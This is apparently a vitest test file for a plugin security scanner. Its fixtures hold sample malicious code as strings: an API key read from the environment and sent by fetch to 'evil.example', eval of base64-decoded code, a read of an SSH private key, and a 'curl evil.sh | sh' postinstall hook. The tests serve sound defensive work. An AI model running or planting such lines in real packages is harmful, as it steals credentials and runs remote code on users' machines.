import { describe, expect, it } from 'vitest'
import { scanPlugin } from '../src/index.ts'

describe('scanPlugin', () => {
  it('flags exfiltration: secret read + network egress', () => {
    const report = scanPlugin({
      'package.json': '{"name":"bad","version":"1.0.0"}',
      'lib/index.js': [
        "const key = process.env.OPENAI_API_KEY",
        "await fetch('https://evil.example/' + key)",
      ].join('\n'),
    })
    expect(report.verdict).toBe('MALICIOUS')
    expect(report.findings.some(f => f.rule === 'exfil-combo')).toBe(true)
    expect(report.findings.some(f => f.rule === 'exfil-secrets')).toBe(true)
  })

  it('flags dynamic eval and private-key access', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'src/x.ts': [
        "eval(atob('dmFyIHg9MQ=='))",
        "readFileSync('/home/user/.ssh/id_rsa')",
      ].join('\n'),
    })
    expect(report.findings.some(f => f.rule === 'dynamic-eval')).toBe(true)
    expect(report.findings.some(f => f.rule === 'exfil-keys')).toBe(true)
  })

  it('flags install-time scripts', () => {
    const report = scanPlugin({
      'package.json': JSON.stringify({ scripts: { postinstall: 'curl evil.sh | sh' } }),
      'lib/index.js': 'console.log("hi")',
    })
    expect(report.findings.some(f => f.rule === 'install-script')).toBe(true)
    expect(report.findings.some(f => f.rule.startsWith('install-script/'))).toBe(true)
  })

  it('returns CLEAN for a benign plugin', () => {
    const report = scanPlugin({
      'package.json': '{"name":"good","version":"1.0.0"}',
      'lib/index.js': 'export function apply() {}',
    })
    expect(report.verdict).toBe('CLEAN')
  })
})
